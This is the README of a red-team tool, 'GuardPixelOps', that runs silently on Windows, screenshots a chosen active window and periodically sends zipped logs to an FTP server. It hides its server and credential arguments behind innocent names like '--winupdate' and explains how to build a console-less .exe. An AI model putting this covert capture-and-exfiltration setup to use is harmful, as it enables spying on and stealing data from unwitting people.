### GuardPixelOps üñ•Ô∏èüõ°Ô∏è

## Overview
GuardPixelOps is a powerful tool designed for Red Team operations and adversary simulations. This Python script focuses on Windows environments, specifically addressing issues sending screenshots. The tool offers functionalities for capturing screenshots and insecurely sending logs to a designated FTP server.

### Important Note: Encoding Information in Base64

Before using GuardPixelOps, please ensure that you encode the following information in Base64 format for the respective command-line arguments:

- `--winupdate`: Microsoft Relay Information
- `--wintoken`: Windows Token
- `--winversion`: Windows Version

Here's an example of how to encode information in Base64 using Python:

```bash
echo -n "your_information_here" | base64
```
Here's an example of how to encode information in Base64 using Powershell:

```bash
[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("your_information_here"))
```

## Features
- **Automated Driver Fixes:** GuardPixelOps identifies and fixes broken drivers in the Windows environment. OF COURSE NOT! This is a joke!
- **Screenshot Capture:** The tool captures screenshots of the active window when a broken driver is detected, providing visual context for analysis. (You kidding me?! It takes screenshots based on the active Window!)
- **Secure Log Transmission:** Logs containing information are insecurely compressed and sent to a specified FTP server for analysis.
- **Background Operation:** GuardPixelOps operates silently in the background, periodically sending logs at regular intervals.

## How It Works
1. **Screenshot Grabbing:** Monitors the active window and captures screenshots when a specified window title is detected. The tool then saves the screenshots and logs the fixed driver information.
2. **Log Transmission:** Compresses the fixed driver logs into a zip file and securely transmits them to a designated FTP server for further analysis.
3. **Background Operation:** Runs as a background process, automatically sending logs at regular intervals.

## Usage
To use GuardPixelOps, provide the following command-line arguments:
- `--winupdate`: FTP Relay information. BASE64 Encoded! üñ•Ô∏è
- `--wintoken`: Authentication User. BASE64 Encoded! üñ•Ô∏è
- `--winversion`: Credentials. BASE64 Encoded! üñ•Ô∏è
- `--regger`: Desired Window name. Plain Text

### Example Command:
```bash
python guardpixelops.py --winupdate <FTP_Relay_information> --wintoken <Authentication_User> --winversion <Credentials> --regger <Desired_Window_name>
```

## Setup
1. Clone the repository: `git clone https://github.com/your-username/guardpixelops.git`
2. Install dependencies: `pip install -r requirements.txt`
3. Run the script: `python guardpixelops.py`

### Compiling to .exe

To enhance portability and simplify distribution, you can compile GuardPixelOps into a standalone executable (.exe) file using [PyInstaller](https://www.pyinstaller.org/).

Ensure you have PyInstaller installed:

```bash
pip install pyinstaller
```

Navigate to the directory containing guardpixelops.py and run the following command in the command prompt:
```bash
pyinstaller --clean -w -F -i NONE "guardpixelops.py" --noconsole
```
Now, you can distribute and run GuardPixelOps as a standalone executable without requiring Python or additional dependencies.
